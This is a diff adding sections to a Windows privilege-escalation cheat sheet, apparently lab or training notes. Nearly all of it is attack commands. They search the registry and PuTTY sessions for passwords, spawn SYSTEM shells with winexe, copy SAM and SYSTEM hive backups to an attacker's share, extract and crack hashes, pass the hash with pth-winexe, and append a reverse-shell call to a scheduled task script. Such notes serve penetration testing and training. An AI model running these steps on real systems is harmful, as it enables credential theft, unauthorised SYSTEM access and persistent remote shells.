@@ -579,8 +579,119 @@ If either of these are missing or disabled, the exploit will not work.
 > msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 ```
 
+## Passwords
+Administrator re-use their passwords, or leave their passwords on the system in readable locations. Windows can be vulnerable to this, as several features of Windows store passwords insecurely.
+## Registry
+Plenty of programs store configuration options in the Windows Registry. Windows itself sometimes will store passwords in plaintext in the Registry. It is always worth searching the Registry for passwords.
+
+## 
+```bash 
+The following commands will search the registry for keys and values that contain “password”
+> reg query HKLM /f password /t REG_SZ /s
+> reg query HKCU /f password /t REG_SZ /s
+This usually generates a lot of results, so often it is more fruitful to look in known locations.
+```
+
+##Privilege Escalations
+```bash
+
+1. Use winPEAS to check common password locations:
+> .\winPEASany.exe quiet filesinfo
+userinfo
+(the final checks will take a long time to complete)
+2. The results show both AutoLogon credentials and Putty
+session credentials for the admin user
+(admin/password123).
+3. We can verify these manually:
+> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+4. On Kali, we can use the winexe command to spawn a shell using these
+credentials:
+# winexe -U 'admin%password123' //192.168.1.22 cmd.exe
+Get the system shell by slightly adding --system flag. 
+
+winexe -U 'admin%password123' --system //192.168.193.129 cmd.exe
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+
+```
+
+## Saved Creds
+```bash
+cmdkey /list
+runas /savecred /user:admin rev.exe
+```
+
+## SAM
+
+Windows store password hashes in the Security Account Manager(SAM). The hashes are encrypted with a key which can be found in a
+file named SYSTEM. If you have the ability to read the SAM and SYSTEM files, you can extract the hashes. The files are locked while Windows is running.
+Backups of the files may exist in the C:\Windows\Repair
+or C:\Windows\System32\config\RegBack directories.
+
+### Privilege Esclations:
+```bash
+1. Backups of the SAM and SYSTEM files can be found in C:\Windows\Repair and are readable by our user.
+2. Copy the files back to Kali:
+> copy C:\Windows\Repair\SAM \\192.168.1.11\tools\
+> copy C:\Windows\Repair\SYSTEM \\192.168.1.11\tools\
+3. Download the latest version of the creddump suite:
+# git clone https://github.com/Neohapsis/creddump7.git
+4. Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:
+# python2 creddump7/pwdump.py SYSTEM SAM
+5. Crack the admin user hash using hashcat:
+# hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
+```
+
+## Passing the Hash
+Windows accepts hashes instead of passwords to authenticate to a number of services. We can use a modified version of winexe, pth-winexe to spawn a command prompt using the admin user’s hash.
+
+### Privilege Escalations:
+```bash
+1. Extract the admin hash from the SAM in the previous step.
+2. Use the hash with pth-winexe to spawn a command prompt:
+# pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
+3. Use the hash with pth-winexe to spawn a SYSTEM level command prompt:
+# pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
+```
+
+### Scheduled Tasks
+Windows can be configured to run tasks at specific times, periodically (e.g. every 5 mins) or when triggered by some event (e.g. a user logon). Tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM.
+
+Unfortunately, there is no easy method for enumerating custom tasks that belong to other users as a low privileged user account.
+List all scheduled tasks your user can see:
+```bash
+> schtasks /query /fo LIST /v
+```
+
+In PowerShell:
+```bash
+
+PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+```
+Often we have to rely on other clues, such as finding a script or log file that indicates a scheduled task is being run.
 
 
+### Privilege Escalation
+```bash
+1.In the C:\DevTools directory, there is a PowerShell script called “CleanUp.ps1”. View the script:
+> type C:\DevTools\CleanUp.ps1
+2. This script seems like it is running every minute as the SYSTEM user. We can check our privileges on this script using accesschk.exe:
+> C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+It appears we have the ability to write to this file. Backup the script:
+> copy C:\DevTools\CleanUp.ps1 C:\Temp\
+4. Start a listener on Kali.
+5. Use echo to append a call to our reverse shell executable to the end of the script:
+> echo C:\PrivEsc\reverse.exe >>
+C:\DevTools\CleanUp.ps1
+6. Wait for the scheduled task to run (it should run every minute) to complete the exploit.
+```
 ### Iperius Backup 6.1.0 - Privilege Escalation
 Scenario: On a VNC accessible machine this service is running. Use the exploit [46863](https://www.exploit-db.com/exploits/46863) in exploitdb.
 
